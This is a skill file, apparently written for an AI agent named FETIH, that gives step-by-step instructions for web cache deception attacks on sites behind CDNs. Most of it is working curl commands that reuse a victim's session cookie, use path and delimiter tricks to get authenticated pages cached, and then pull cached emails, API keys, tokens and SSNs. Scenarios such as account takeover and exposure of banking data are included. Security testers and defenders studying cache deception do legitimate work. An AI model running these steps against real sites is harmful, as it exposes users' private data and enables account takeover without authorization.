---
name: performing-web-cache-deception-attack
description: Execute web cache deception attacks by exploiting path normalization discrepancies between CDN caching layers and origin servers to cache and retrieve sensitive authenticated content.
tags:
- cache-poisoning
- static-resource
- cdn-attack
- cloudflare
- cache-key
- web-application-security
- fetih
- cybersecurity
- web-cache-deception
- siber-güvenlik
- path-normalization
triggers:
- CSRF
- SQL injection
- XSS
- api
- attack
- authentication
- cache
- cloud
- deception
- dns
- email
- endpoint
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
adapted_for: fetih
---

# Performing Web Cache Deception Attack


## Ne Zaman Kullanılır
- testing yaparken applications behind CDNs or reverse proxies (Cloudflare, Akamai, Varnish, Nginx)
- During assessment of authenticated page caching behavior
- evaluating yaparken: path normalization differences between caching and origin layers
- During bug bounty hunting on applications with aggressive caching policies
- testing yaparken for sensitive data exposure through cache layer misconfiguration

## Ön Gereksinimler
- Understanding of HTTP caching mechanisms (Cache-Control, Vary, Age headers)
- Bilgi: CDN path normalization and cache key construction
- Burp Suite for intercepting and crafting requests
- Two browser sessions (authenticated victim and unauthenticated attacker)
- Understanding of URL path parsing differences across technologies
- Familiarity with common CDN platforms (Cloudflare, Akamai, Fastly, AWS CloudFront)


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## İş Akışı

### Adım 1 — Identify Caching Layer and Behavior
```bash
curl -I http://target.com/account/profile

curl -I "http://target.com/static/style.css"

for ext in css js png jpg gif svg ico woff woff2 pdf; do
  echo -n "$ext: "
  curl -sI "http://target.com/test.$ext" | grep -i "x-cache\|cf-cache"
done
```

### Adım 2 — Test Path-Based Cache Deception
```bash

curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/anything.css"

curl "http://target.com/account/profile/anything.css"

for ext in css js png jpg svg ico woff2; do
  curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/x.$ext" -o /dev/null
  sleep 2
  echo -n "$ext: "
  curl -s "http://target.com/account/profile/x.$ext" | head -c 200
  echo
done
```

### Adım 3 — Exploit Delimiter-Based Discrepancies
```bash
curl -b "session=VICTIM" "http://target.com/account/profile;anything.css"

curl -b "session=VICTIM" "http://target.com/account/profile%2Fstatic.css"
curl -b "session=VICTIM" "http://target.com/account/profile%3Bstyle.css"

curl -b "session=VICTIM" "http://target.com/account/profile%00.css"

curl -b "session=VICTIM" "http://target.com/account/profile%23.css"

curl -b "session=VICTIM" "http://target.com/static/..%2Faccount/profile"
```

### Adım 4 — Test Normalization Discrepancies
```bash

curl -b "session=VICTIM" "http://target.com/static/../account/profile"

curl -b "session=VICTIM" "http://target.com/static/..%2faccount/profile"

curl -b "session=VICTIM" "http://target.com/account/profile/X.CSS"

curl -b "session=VICTIM" "http://target.com/account/profile/%252e%252e/static.css"
```

### Adım 5 — Exploit Cache Key Manipulation
```bash

curl -b "session=VICTIM" "http://target.com/account/profile?cachebuster=123.css"

curl -b "session=VICTIM" "http://target.com/account/profile/./style.css"
curl "http://target.com/account/profile/./style.css"  # Check if cached

curl -b "session=VICTIM" -H "X-Original-URL: /account/profile" \
  "http://target.com/static/cached.css"
```

### Adım 6 — Verify and Şunu belgele: Attack
```bash

curl -I "http://target.com/account/profile/x.css"

curl -s "http://target.com/account/profile/x.css" | grep -i "email\|name\|token\|api_key\|ssn"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Cache Deception | Tricking CDN into caching authenticated dynamic content as static resource |
| Path Normalization | How CDN and origin differently resolve path segments (../, ;, encoded chars) |
| Cache Key | The identifier CDN uses to store/retrieve cached responses (typically URL path) |
| Static Extension Trick | Appending .css/.js/.png to dynamic URLs to trigger caching behavior |
| Delimiter Discrepancy | Characters (;, ?, #) interpreted differently by cache vs. origin server |
| Cache Poisoning vs Deception | Poisoning modifies cache for all users; deception caches specific victim data |
| Vary Header | HTTP header controlling which request attributes affect cache key |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for crafting cache deception requests |
| curl | Command-line testing of cache behavior and response headers |
| Web Cache Vulnerability Scanner | Automated tool for Tespit etme cache deception/poisoning |
| Param Miner | Burp extension for discovering unkeyed cache parameters |
| Cloudflare Diagnostics | Analyzing CF-Cache-Status and cf-ray headers |
| Varnish CLI | Direct cache Denetle:ion for Varnish-based setups |

## Common Scenarios

1. **Profile Data Theft** — Cache authenticated user profile pages containing PII (email, address, phone) by appending .css extension to profile URLs
2. **API Token Exposure** — Cache API dashboard pages showing tokens and secrets through path manipulation on CDN
3. **Account Takeover** — Cache pages containing session tokens or CSRF tokens, then use stolen tokens for account takeover
4. **Financial Data Exposure** — Cache banking or payment pages showing account balances and transaction history
5. **Admin Panel Caching** — Cache admin pages accessible through delimiter-based path confusion on CDN

## Output Format

```
## Web Cache Deception Report
- **Target**: http://target.com
- **CDN**: Cloudflare
- **Vulnerability**: Path-based cache deception via static extension appending

### Cache Behavior Analysis
| Extension | Cached | Cache-Control | TTL |
|-----------|--------|---------------|-----|
| .css | Yes | public, max-age=86400 | 24h |
| .js | Yes | public, max-age=86400 | 24h |
| .png | Yes | public, max-age=604800 | 7d |

### Exploitation Results
| Victim URL | Cached Data | Sensitive Fields |
|-----------|-------------|-----------------|
| /account/profile/x.css | Full profile page | Email, Name, API Key |
| /account/settings/x.js | Settings page | 2FA backup codes |

### İyileştirme
- Configure CDN to respect Cache-Control: no-store on dynamic pages
- Implement Vary: Cookie header on authenticated endpoints
- Use path-based routing rules that reject unexpected extensions
- Enable consistent path normalization between CDN and origin
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 798c1c0776054d9e
-->

